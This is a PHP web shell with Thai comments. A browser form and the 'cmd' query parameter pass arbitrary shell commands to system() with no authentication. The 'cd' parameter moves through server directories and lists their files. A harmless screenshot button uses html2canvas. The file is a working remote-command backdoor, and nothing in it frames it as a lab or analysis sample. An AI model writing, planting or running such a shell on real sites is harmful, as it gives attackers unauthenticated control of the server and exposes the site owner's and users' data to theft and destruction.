<?php
session_start();

// กำหนด path เริ่มต้น
if (!isset($_SESSION['cwd'])) {
    $_SESSION['cwd'] = getcwd();
}

// ถ้ามีการเปลี่ยน directory
if (isset($_GET['cd'])) {
    $newDir = realpath($_SESSION['cwd'] . '/' . $_GET['cd']);
    if ($newDir && is_dir($newDir)) {
        $_SESSION['cwd'] = $newDir;
    }
}

// รันคำสั่ง
if (isset($_GET['cmd'])) {
    chdir($_SESSION['cwd']);
    echo "<pre>";
    system($_GET['cmd']);
    echo "</pre>";
}

// แสดง path ปัจจุบัน
echo "<h3>Current Path: " . $_SESSION['cwd'] . "</h3>";

// ปุ่มย้อนกลับ
echo "<a href='?cd=..'>⬅ Back</a><br><br>";

// แสดงไฟล์ใน directory
$files = scandir($_SESSION['cwd']);
foreach ($files as $file) {
    if ($file == ".") continue;

    if (is_dir($_SESSION['cwd'] . '/' . $file)) {
        echo "[DIR] <a href='?cd=$file'>$file</a><br>";
    } else {
        echo "[FILE] $file<br>";
    }
}
?>

<hr>

<div style="margin: 12px 0;">
    <button type="button" id="captureBtn">Capture หน้านี้</button>
    <span id="captureStatus" style="margin-left: 8px;"></span>
</div>

<div id="capturePreview" style="margin: 12px 0;"></div>

<form method="GET">
    <input type="text" name="cmd" placeholder="Enter command">
    <input type="submit" value="Run">
</form>

<script src="https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js"></script>
<script>
  (function () {
    var btn = document.getElementById('captureBtn');
    var statusEl = document.getElementById('captureStatus');
    var preview = document.getElementById('capturePreview');

    if (!btn || !statusEl || !preview || !window.html2canvas) return;

    btn.addEventListener('click', async function () {
      statusEl.textContent = 'Capturing...';
      preview.innerHTML = '';

      try {
        var canvas = await window.html2canvas(document.body, {
          useCORS: true,
          backgroundColor: '#ffffff'
        });

        var img = document.createElement('img');
        img.src = canvas.toDataURL('image/png');
        img.alt = 'capture';
        img.style.maxWidth = '100%';
        img.style.border = '1px solid #ccc';
        img.style.display = 'block';
        preview.appendChild(img);
        statusEl.textContent = 'Done';
      } catch (e) {
        statusEl.textContent = 'Failed: ' + (e && e.message ? e.message : e);
      }
    });
  })();
</script>